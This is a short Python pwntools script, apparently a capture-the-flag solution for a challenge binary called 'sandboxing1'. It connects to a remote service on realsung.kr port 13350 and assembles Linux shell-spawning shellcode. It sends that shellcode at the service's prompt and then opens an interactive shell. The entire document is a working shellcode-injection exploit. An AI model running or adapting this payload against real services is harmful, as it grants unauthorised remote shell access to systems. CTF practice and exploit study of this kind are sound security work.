from pwn import *
context.clear(arch='amd64', os='linux')

context.log_level = 'debug'
p = remote("realsung.kr", 13350)
# p = process("./sandboxing1")
e = ELF("./sandboxing1")

shellcode = shellcraft.linux.sh()
payload = asm(shellcode)

p.sendlineafter(b"> ", payload)

p.interactive()
